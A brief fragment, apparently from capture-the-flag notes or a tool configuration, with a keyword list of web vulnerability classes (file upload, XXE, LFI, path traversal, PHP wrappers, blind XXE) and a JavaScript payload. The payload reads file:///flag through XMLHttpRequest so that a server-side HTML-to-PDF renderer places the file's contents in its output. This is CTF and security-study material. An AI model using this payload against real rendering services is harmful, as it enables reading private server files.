...
signals:
  ['file upload', 'XXE', 'LFI', 'path traversal', '文件上传', '路径穿越', 'PHP wrapper', '盲XXE']
...
<script>
  var xhr = new XMLHttpRequest(); xhr.open('GET', 'file:///flag', false); xhr.send();
  document.body.innerText = xhr.responseText; // PDF 渲染后 → 页面包含 flag 内容
</script>
```
